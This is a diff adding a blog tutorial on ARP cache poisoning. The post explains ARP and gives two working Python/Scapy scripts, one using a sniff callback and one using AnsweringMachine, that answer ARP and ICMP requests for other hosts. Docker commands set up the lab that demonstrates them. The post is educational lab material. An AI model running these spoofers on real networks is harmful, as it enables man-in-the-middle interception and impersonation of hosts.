@@ -37,13 +37,15 @@
 </header>
 <main class="page-content" aria-label="Content">
       <div class="wrapper">
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+        <a href="/blogs">&lt; To Blog home</a>
+
+<article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
 
   <header class="post-header">
     <h1 class="post-title p-name" itemprop="name headline">ARP Spoofing using Scapy</h1>
     <p>
       
-        <code>advanced</code>
+        <code>advanced</code> <code>application</code> <code>cybersecurity</code> <code>networking</code> <code>arp</code>
       
     </p>
     <p class="post-meta">
@@ -52,9 +54,207 @@
   </header>
 
   <div class="post-content e-content" itemprop="articleBody">
-    
+    <p><strong>ARP spoofing</strong> or <strong>ARP cache poisoning</strong> is a network exploitation technique in which a malicious node in a local area network claims itself to be one of the other nodes in the network. A malicious user performs this attack on LAN to establish itself as a man in the middle, or sometimes act as the destination node itself.</p>
 
-  </div><a class="u-url" href="/2020/08/02/arp-spoofing-using-scapy.html" hidden></a>
+<h2 id="what-is-arp">What is ARP?</h2>
+
+<p><strong>ARP</strong> stands for <strong>Address resolution protocol</strong>. This protocol works between Layer 2 and Layer 3 of the OSI model. The goal of this protocol is to exchange the MAC address of the next-hop node when the requesting node knows the IP address of the next-hop node.</p>
+
+<p>Consider a LAN network having subnet ID <code class="language-plaintext highlighter-rouge">172.17.0.0/24</code>, where a node, <code class="language-plaintext highlighter-rouge">Node A</code>, is trying to navigate to the <code class="language-plaintext highlighter-rouge">kmmanoj.me</code> website. <code class="language-plaintext highlighter-rouge">Node A</code> has an IP address <code class="language-plaintext highlighter-rouge">172.17.0.2</code>, which it received from the DHCP pool when it first entered the network. In addition to the IP address, <code class="language-plaintext highlighter-rouge">Node A</code> also obtained the gateway IP address (say, <code class="language-plaintext highlighter-rouge">172.17.0.1</code>) and the DNS IP address (say, <code class="language-plaintext highlighter-rouge">172.17.0.100</code>) during the DHCP offer. To make an HTTP request to <code class="language-plaintext highlighter-rouge">kmmanoj.me</code>, <code class="language-plaintext highlighter-rouge">Node A</code> begins by building the packet. While building the IP layer (L3) of the packet it needs to fill in the IP address in the dst field of the L3 headers. Let’s say, it found the hostname-IP mapping in its own cache (after all it is a frequently accessed website) and hence didn’t perform a DNS request. Then, the packet building proceeds to the data link layer (L2). Now, <code class="language-plaintext highlighter-rouge">Node A</code> needs to fill in the destination MAC address in <code class="language-plaintext highlighter-rouge">dst</code> field of the L2 headers. It realizes that the destination IP address is outside the subnet in which it is residing. The node then looks into its routing table and identifies the next-hop IP address i.e. the gateway IP address. Hence, in the L2 header of the HTTP request, it needs to fill in the MAC address of the gateway node. Thus, <code class="language-plaintext highlighter-rouge">Node A</code> makes an ARP request by broadcasting a message that says “Hey, everyone! I am Node A, and here is my MAC address and my IP address. Tell me who is <code class="language-plaintext highlighter-rouge">172.17.0.1</code>!” The appropriate node i.e. the gateway, replies with an ARP response by sending a unicast message that says “Hey, Node A! I am gateway, and here is my MAC address and my IP address. My MAC address is <code class="language-plaintext highlighter-rouge">00:01:02:03:04:05</code>.” Once, <code class="language-plaintext highlighter-rouge">Node A</code> receives the MAC address, it fills in the details in the L2 header of the HTTP request and puts the packet into the network. The rest is history!</p>
+
+<p>The following two images show the network capture of ARP request and ARP response in the LAN:</p>
+
+<p><img src="/assets/img/arp-scapy/arp-a.png" alt="ARP request by Node A" />
+<br /><small style="color: gray">ARP request by Node A</small><br /></p>
+
+<p><img src="/assets/img/arp-scapy/arp-gw.png" alt="ARP request by the gateway" />
+<br /><small style="color: gray">ARP request by the gateway</small><br /></p>
+
+<h2 id="the-unauthenticable-response">The “unauthenticable” response</h2>
+
+<p>Carefully observe the last couple of network transactions. An ARP request is broadcasted into the LAN because <code class="language-plaintext highlighter-rouge">Node A</code> does not know the MAC address of the gateway. <code class="language-plaintext highlighter-rouge">Node A</code> then receives a response from the “relevant” node. <code class="language-plaintext highlighter-rouge">Node A</code> has no way to authenticate the response it got. It has to blindly believe that the MAC address claimed in the response is the MAC address of the gateway. This is where ARP spoofing comes into play!</p>
+
+<p>A malicious node in the LAN could respond back to <code class="language-plaintext highlighter-rouge">Node A</code> as soon as it sees an ARP request in the LAN from <code class="language-plaintext highlighter-rouge">Node A</code>. Luckily, if the malicious node’s response reaches <code class="language-plaintext highlighter-rouge">Node A</code> first then the malicious node has successfully spoofed itself as the node that <code class="language-plaintext highlighter-rouge">Node A</code> is to communicate with.</p>
+
+<h2 id="dont-talk-show-me-the-code">Don’t talk, show me the code!</h2>
+
+<p>In this demonstration, Docker containers are used as nodes and a <a href="https://www.docker.com/products/docker-desktop">Docker</a> network as the local area network. <a href="https://scapy.net/">Scapy</a>, a network utility to craft custom packets, is used in the malicious node to craft spoofed ARP response and spoofed ICMP responses.</p>
+
+<h3 id="magic">Magic</h3>
+
+<p>The following terminal snapshot shows a successful ARP spoof. Observe that the docker network, named lan and having subnet ID <code class="language-plaintext highlighter-rouge">192.168.56.0/24</code>, has only two nodes with IP addresses <code class="language-plaintext highlighter-rouge">192.168.56.2</code> and <code class="language-plaintext highlighter-rouge">192.168.56.3</code>. But surprisingly, a node is able to make successful pings to <code class="language-plaintext highlighter-rouge">192.168.56.4</code>!</p>
+
+<p><img src="/assets/img/arp-scapy/magic.png" alt="Magic" /></p>
+
+<h3 id="the-spoofer">The Spoofer</h3>
+
+<p>In this demonstration, we shall spoof ourselves as a node that is not alive in the LAN. Hence, when a victim node makes an ARP request to an IP address that is not live, the spoofer node jumps in to claim the node as itself by responding to the ARP request with its own MAC address. In other words, the spoofer node is going to respond to the request meant for other nodes.</p>
+
+<p>The spoofer code is written in python 3 and uses the Scapy library. Code format inspired by <a href="https://thepacketgeek.com/scapy/building-network-tools/part-09/">https://thepacketgeek.com/scapy/building-network-tools/part-09/</a></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">INTERFACE</span> <span class="o">=</span> <span class="s">"eth0"</span>
+<span class="n">MY_MAC_ADDRESS</span> <span class="o">=</span> <span class="nf">get_if_hwaddr</span><span class="p">(</span><span class="n">INTERFACE</span><span class="p">)</span>
+<span class="n">MY_IP_ADDRESS</span> <span class="o">=</span> <span class="nf">get_if_addr</span><span class="p">(</span><span class="n">INTERFACE</span><span class="p">)</span>
+
+<span class="s">'''
+Approach 1: using prn function as a workaround
+$ python3 arp_spoof.py
+'''</span>
+<span class="k">def</span> <span class="nf">spoofer</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="nf">haslayer</span><span class="p">(</span><span class="s">'ARP'</span><span class="p">)</span> <span class="ow">and</span> <span class="n">request</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">op</span> <span class="o">==</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">request</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">pdst</span> <span class="o">!=</span> <span class="n">MY_IP_ADDRESS</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"ARP request from </span><span class="si">{</span><span class="n">request</span><span class="p">[</span><span class="n">Ether</span><span class="p">].</span><span class="n">src</span><span class="si">}</span><span class="s"> / </span><span class="si">{</span><span class="n">request</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">psrc</span><span class="si">}</span><span class="s"> for </span><span class="si">{</span><span class="n">request</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">pdst</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="nc">Ether</span><span class="p">()</span><span class="o">/</span><span class="nc">ARP</span><span class="p">()</span>
+
+        <span class="n">response</span><span class="p">[</span><span class="n">Ether</span><span class="p">].</span><span class="n">dst</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">Ether</span><span class="p">].</span><span class="n">src</span>
+        <span class="n">response</span><span class="p">[</span><span class="n">Ether</span><span class="p">].</span><span class="n">src</span> <span class="o">=</span> <span class="n">MY_MAC_ADDRESS</span>
+
+        <span class="n">response</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">op</span> <span class="o">=</span> <span class="mi">2</span>
+        <span class="n">response</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">hwsrc</span> <span class="o">=</span> <span class="n">MY_MAC_ADDRESS</span>
+        <span class="n">response</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">hwdst</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">hwsrc</span>
+        <span class="n">response</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">psrc</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">pdst</span>
+        <span class="n">response</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">pdst</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">psrc</span>
+
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"ARP response as </span><span class="si">{</span><span class="n">response</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">psrc</span><span class="si">}</span><span class="s"> with MAC address </span><span class="si">{</span><span class="n">response</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">hwsrc</span><span class="si">}</span><span class="s"> to </span><span class="si">{</span><span class="n">response</span><span class="p">[</span><span class="n">Ether</span><span class="p">].</span><span class="n">dst</span><span class="si">}</span><span class="s"> / </span><span class="si">{</span><span class="n">response</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">pdst</span><span class="si">}</span><span class="s"> for </span><span class="si">{</span><span class="n">response</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">psrc</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="nf">sendp</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
+    
+    <span class="k">elif</span> <span class="n">request</span><span class="p">.</span><span class="nf">haslayer</span><span class="p">(</span><span class="s">'ICMP'</span><span class="p">)</span> <span class="ow">and</span> <span class="n">request</span><span class="p">[</span><span class="n">ICMP</span><span class="p">].</span><span class="nb">type</span> <span class="o">==</span> <span class="mi">8</span> <span class="ow">and</span> <span class="n">request</span><span class="p">[</span><span class="n">IP</span><span class="p">].</span><span class="n">dst</span> <span class="o">!=</span> <span class="n">MY_IP_ADDRESS</span> <span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"ICMP request from </span><span class="si">{</span><span class="n">request</span><span class="p">[</span><span class="n">IP</span><span class="p">].</span><span class="n">src</span><span class="si">}</span><span class="s"> to </span><span class="si">{</span><span class="n">request</span><span class="p">[</span><span class="n">IP</span><span class="p">].</span><span class="n">dst</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="nc">Ether</span><span class="p">()</span><span class="o">/</span><span class="nc">IP</span><span class="p">()</span><span class="o">/</span><span class="nc">ICMP</span><span class="p">()</span><span class="o">/</span><span class="s">""</span>
+
+        <span class="n">response</span><span class="p">[</span><span class="n">Ether</span><span class="p">].</span><span class="n">dst</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">Ether</span><span class="p">].</span><span class="n">src</span>
+        <span class="n">response</span><span class="p">[</span><span class="n">Ether</span><span class="p">].</span><span class="n">src</span> <span class="o">=</span> <span class="n">MY_MAC_ADDRESS</span>
+
+        <span class="n">response</span><span class="p">[</span><span class="n">IP</span><span class="p">].</span><span class="n">src</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">IP</span><span class="p">].</span><span class="n">dst</span>
+        <span class="n">response</span><span class="p">[</span><span class="n">IP</span><span class="p">].</span><span class="n">dst</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">IP</span><span class="p">].</span><span class="n">src</span>
+
+        <span class="n">response</span><span class="p">[</span><span class="n">ICMP</span><span class="p">].</span><span class="nb">type</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="n">response</span><span class="p">[</span><span class="n">ICMP</span><span class="p">].</span><span class="nb">id</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">ICMP</span><span class="p">].</span><span class="nb">id</span>
+        <span class="n">response</span><span class="p">[</span><span class="n">ICMP</span><span class="p">].</span><span class="n">seq</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">ICMP</span><span class="p">].</span><span class="n">seq</span>
+
+        <span class="n">response</span><span class="p">[</span><span class="n">Raw</span><span class="p">].</span><span class="n">load</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">Raw</span><span class="p">].</span><span class="n">load</span>
+
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"ICMP response to </span><span class="si">{</span><span class="n">response</span><span class="p">[</span><span class="n">IP</span><span class="p">].</span><span class="n">dst</span><span class="si">}</span><span class="s"> as </span><span class="si">{</span><span class="n">response</span><span class="p">[</span><span class="n">IP</span><span class="p">].</span><span class="n">src</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="nf">sendp</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
+
+<span class="nf">sniff</span><span class="p">(</span><span class="n">prn</span><span class="o">=</span><span class="n">spoofer</span><span class="p">,</span> <span class="n">iface</span><span class="o">=</span><span class="n">INTERFACE</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>The main function sniffs for packets in the local area network. Each packet is processed by the <code class="language-plaintext highlighter-rouge">spoofer</code> function.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">spoofer</code> function handles two types of request:</p>
+
+<ul>
+  <li>ARP request not for itself</li>
+  <li>ICMP request not for itself</li>
+</ul>
+
+<p>For the ARP request, it crafts an ARP response packet. It sets the destination MAC address and IP address with sender details. It fills the source MAC address as it’s own MAC address, while source IP address as the destination IP address found in the request packet. This is how the malicious node is able to claim itself as the IP address in the request packet.</p>
+
+<p>The implementation performs a similar header value setting for the ICMP response too.</p>
+
+<h3 id="setup">Setup</h3>
+
+<p>The lab environment used here is a machine that has <a href="https://www.docker.com/products/docker-desktop">Docker engine</a> installed. Let us first create a docker network with subnet ID <code class="language-plaintext highlighter-rouge">192.168.56.0/24</code>. Run the following command to create the docker network with an identifier, lan.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker network create lan <span class="nt">--subnet</span> 192.168.56.0/24
+</code></pre></div></div>
+
+<p>In a terminal instance, spin up a <code class="language-plaintext highlighter-rouge">scapy</code> docker container in lan network in interactive mode and requesting for a TTY. In addition, mount the volume which contains the spoofer code. (Or you could perform a <a href="https://docs.docker.com/engine/reference/commandline/cp/">docker copy</a>) The <a href="https://github.com/kmm4n0j/100days_of_infosec/blob/master/scapy/dockerfile">scapy</a> docker image is built on top of <code class="language-plaintext highlighter-rouge">ehlers/scapy</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run <span class="nt">-it</span> <span class="nt">--network</span> lan <span class="nt">-v</span> <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>/arp_spoof.py:/arp_spoof.py scapy
+</code></pre></div></div>
+
+<p>Run the <code class="language-plaintext highlighter-rouge">arp_spoof.py</code> file</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 /arp_spoof.py
+</code></pre></div></div>
+
+<p>Then, in another terminal instance spin up a <code class="language-plaintext highlighter-rouge">busybox</code> container in lan network in interactive mode and requesting for a TTY. A <code class="language-plaintext highlighter-rouge">busybox</code> docker image has network utilities, such as ping and nslookup, pre-installed in them.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run <span class="nt">-it</span> <span class="nt">--network</span> lan busybox
+</code></pre></div></div>
+
+<p>Now, ping different IP addresses and observe that every IP address is reachable, while, there are only two nodes in the network! Hence, the spoofer was successfully able to imitate itself as other nodes in the LAN!</p>
+
+<p><img src="/assets/img/arp-scapy/demo.png" alt="Demonstration" /></p>
+
+<h2 id="how-and-why-does-it-work">How and why does it work?</h2>
+
+<p>Let me keep it brief! Similar to the HTTP request, the ICMP request is being crafted by the <code class="language-plaintext highlighter-rouge">busybox</code> container. To fill in L2 header values, it broadcasts an ARP request. The spoofer jumps in and replies with an ARP unicast response. The <code class="language-plaintext highlighter-rouge">busybox</code> container learns the MAC address (as spoofer’s MAC address) associated with the requested IP address. Thus, the ping requests coming into the network hops to the network interface associated with the spoofer’s MAC address.</p>
+
+<h3 id="extended-arp-spoofing-using-scapy-answering-machine">Extended: ARP Spoofing using Scapy Answering machine</h3>
+
+<p>Inspired by <a href="https://twitter.com/guedou">guedou</a>!</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">sys</span>
+
+<span class="kn">from</span> <span class="n">threading</span> <span class="kn">import</span> <span class="n">Thread</span>
+<span class="kn">from</span> <span class="n">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">INTERFACE</span> <span class="o">=</span> <span class="s">"eth0"</span>
+<span class="n">MY_MAC_ADDRESS</span> <span class="o">=</span> <span class="nf">get_if_hwaddr</span><span class="p">(</span><span class="n">INTERFACE</span><span class="p">)</span>
+<span class="n">MY_IP_ADDRESS</span> <span class="o">=</span> <span class="nf">get_if_addr</span><span class="p">(</span><span class="n">INTERFACE</span><span class="p">)</span>
+
+<span class="s">'''
+Approach 2: Using AnsweringMachine
+$ python3 arp_spoof.py
+'''</span>
+
+<span class="k">class</span> <span class="nc">ARPSpoofer</span><span class="p">(</span><span class="n">AnsweringMachine</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">is_request</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">request</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">request</span><span class="p">.</span><span class="nf">haslayer</span><span class="p">(</span><span class="s">'ARP'</span><span class="p">)</span> <span class="ow">and</span> <span class="n">request</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">op</span> <span class="o">==</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">request</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">pdst</span> <span class="o">!=</span> <span class="n">MY_IP_ADDRESS</span>
+    
+    <span class="k">def</span> <span class="nf">make_reply</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">request</span><span class="p">):</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="nc">Ether</span><span class="p">()</span><span class="o">/</span><span class="nc">ARP</span><span class="p">()</span>
+
+        <span class="n">response</span><span class="p">[</span><span class="n">Ether</span><span class="p">].</span><span class="n">dst</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">Ether</span><span class="p">].</span><span class="n">src</span>
+        <span class="n">response</span><span class="p">[</span><span class="n">Ether</span><span class="p">].</span><span class="n">src</span> <span class="o">=</span> <span class="n">MY_MAC_ADDRESS</span>
+
+        <span class="n">response</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">op</span> <span class="o">=</span> <span class="mi">2</span>
+        <span class="n">response</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">hwsrc</span> <span class="o">=</span> <span class="n">MY_MAC_ADDRESS</span>
+        <span class="n">response</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">hwdst</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">hwsrc</span>
+        <span class="n">response</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">psrc</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">pdst</span>
+        <span class="n">response</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">pdst</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">psrc</span>
+
+        <span class="k">return</span> <span class="n">response</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span>
+
+<span class="k">class</span> <span class="nc">PingResponder</span><span class="p">(</span><span class="n">AnsweringMachine</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">is_request</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">request</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">request</span><span class="p">.</span><span class="nf">haslayer</span><span class="p">(</span><span class="s">'ICMP'</span><span class="p">)</span> <span class="ow">and</span> <span class="n">request</span><span class="p">[</span><span class="n">ICMP</span><span class="p">].</span><span class="nb">type</span> <span class="o">==</span> <span class="mi">8</span> <span class="ow">and</span> <span class="n">request</span><span class="p">[</span><span class="n">IP</span><span class="p">].</span><span class="n">dst</span> <span class="o">!=</span> <span class="n">MY_IP_ADDRESS</span>
+    
+    <span class="k">def</span> <span class="nf">make_reply</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">request</span><span class="p">):</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="nc">Ether</span><span class="p">()</span><span class="o">/</span><span class="nc">IP</span><span class="p">()</span><span class="o">/</span><span class="nc">ICMP</span><span class="p">()</span><span class="o">/</span><span class="s">""</span>
+
+        <span class="n">response</span><span class="p">[</span><span class="n">Ether</span><span class="p">].</span><span class="n">dst</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">Ether</span><span class="p">].</span><span class="n">src</span>
+        <span class="n">response</span><span class="p">[</span><span class="n">Ether</span><span class="p">].</span><span class="n">src</span> <span class="o">=</span> <span class="n">MY_MAC_ADDRESS</span>
+
+        <span class="n">response</span><span class="p">[</span><span class="n">IP</span><span class="p">].</span><span class="n">src</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">IP</span><span class="p">].</span><span class="n">dst</span>
+        <span class="n">response</span><span class="p">[</span><span class="n">IP</span><span class="p">].</span><span class="n">dst</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">IP</span><span class="p">].</span><span class="n">src</span>
+
+        <span class="n">response</span><span class="p">[</span><span class="n">ICMP</span><span class="p">].</span><span class="nb">type</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="n">response</span><span class="p">[</span><span class="n">ICMP</span><span class="p">].</span><span class="nb">id</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">ICMP</span><span class="p">].</span><span class="nb">id</span>
+        <span class="n">response</span><span class="p">[</span><span class="n">ICMP</span><span class="p">].</span><span class="n">seq</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">ICMP</span><span class="p">].</span><span class="n">seq</span>
+
+        <span class="n">response</span><span class="p">[</span><span class="n">Raw</span><span class="p">].</span><span class="n">load</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">Raw</span><span class="p">].</span><span class="n">load</span>
+
+        <span class="k">return</span> <span class="n">response</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span>
+
+<span class="n">arp_spoofer</span> <span class="o">=</span> <span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="nc">ARPSpoofer</span><span class="p">())</span>
+<span class="n">arp_spoofer</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
+
+<span class="n">ping_responder</span> <span class="o">=</span> <span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="nc">PingResponder</span><span class="p">())</span>
+<span class="n">ping_responder</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
+
+<span class="n">arp_spoofer</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>
+<span class="n">ping_responder</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>
+</code></pre></div></div>
+
+  </div>
+
+
+  <a href="/blogs">&lt; To Blog home</a><a class="u-url" href="/2020/08/02/arp-spoofing-using-scapy.html" hidden></a>
 </article>
 
       </div>
